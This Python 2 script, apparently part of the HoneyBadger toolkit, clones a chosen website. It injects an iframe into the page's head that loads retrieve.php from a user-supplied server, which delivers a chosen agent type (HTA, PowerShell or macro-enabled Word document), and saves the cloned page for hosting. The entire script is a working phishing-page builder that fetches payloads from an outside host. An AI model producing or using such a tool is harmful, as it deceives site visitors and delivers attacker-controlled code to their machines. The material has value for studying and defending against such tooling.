#!/usr/bin/env python

from subprocess import check_output
import urllib2

site = raw_input("URL to clone: ").strip()
agent = raw_input("Agent, [hta, ps1d, docm]: ").strip()
hurl = raw_input("URL to honeybadger folder: ").strip()
if agent not in ['hta','ps1d','docm']:
	print "Not a valid agent choice"
	exit(1)

data = urllib2.urlopen(site).read()

inject = "<iframe src='%s/retrieve.php?%s' ></iframe>" % (hurl, agent)

if "<head>" in data:
	temp = data.split("<head>")
	temp[1] = inject + temp[1]
	data = "<head>".join(temp)

else:
	data += inject

fi = open("agents/custom.html", "w")
fi.write(data)
fi.close()

print "Your cloned site has been saved to admin/agents/custom.html"
exit(0)
